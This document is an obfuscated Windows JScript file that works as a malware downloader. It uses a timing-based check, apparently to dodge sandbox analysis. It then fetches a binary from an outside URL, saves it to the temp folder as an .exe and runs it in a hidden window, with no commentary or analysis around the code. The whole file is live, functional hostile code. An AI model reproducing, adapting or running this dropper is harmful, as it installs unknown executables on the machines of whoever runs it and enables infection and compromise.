var _C0 = false;
var _T = "CreateObject";
var _N = function _LG() {return WScript[_T]("WScript"+".Shell");}(), _C = 11;
var _JE = "MSXML2.XMLHTTP";
var _GJ = 2123213;
var _O = 0;
function _RS(_K){_N["Run"](_K, _O, _O);};
function _A(){return _JE + "";};
function _F(_JM, _WM){_O = _O * 1; return _JM - _WM;};
function _BX(){return _T;};
/*@cc_on
  @if (@_win32 || @_win64)
    _C0 = true;
  @end
@*/
if (_C0)
{
var _HL = "";
function _W(){return 22;};
var _JA = 0; var _QJ = 0;
function _Z()
{
var _BV = new this["Date"]();
var _J1 = _BV["getUTCMilliseconds"]();
WScript["Sleep"](_W());
var _BV = new this["Date"]();
var _YR = _BV["getUTCMilliseconds"]();
WScript["Sleep"](_W());
var _BV = new this["Date"]();
var _Q0 = _BV["getUTCMilliseconds"]();
var _JA = "_AQ";
_JA = _F(_YR, _J1);
var _QJ = "_J0";
_QJ = _F(_Q0, _YR);
_HL = "open";
return _F(_JA, _QJ);
}
var _H0 = false;
var _HI = false;
for (var _JV = _O; _JV < _W() * 1; _JV++){if (_Z() != _O){
_H0 = true; 
_QJ = "31" + 11 * _JA + _QJ; 
_HI = true; 
break;
}}
function _J() {return ((_H0 == true) && (_H0 == _HI)) ? 1 : _O;};
if (_H0 && _J() && _HI){
function _FN() {return _N["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "lkK5ttZWQN5.ex" + "e";};
 _BQ = _A();
 _AJ = WScript[_T](_BQ);
 var _S = 1;
 while (_S){
try {
	if (_S == 1)
	{
		_AJ[_HL]("GET", "http://linkownia.itcom.pl/s9aps", false);
		_AJ["send"]();
		_H = "Sleep";
	}
	WScript[_H](_W() + 120); 
	if (_AJ["readystate"] < 2 * 2) continue;
	_S = _O;
	function _Q(_I) {var _B = (1, 2, 3, 4, 5, _I); return _B;};
	_V = WScript[_BX()]("ADODB.Stream");
	_BQ = _V;
	_BQ[_HL]();
	_BQ["type"] = _Q(1);
	_BQ["write"](_AJ["ResponseBody"]);
	_V["position"] = _Q(_O);
	_BQ["Save" + "ToFile"](_FN(), 2);
	_V["cl"+"ose"]();
	_JC = _FN();
	_RS(_JC);
} catch(_A0){};
}
}
}

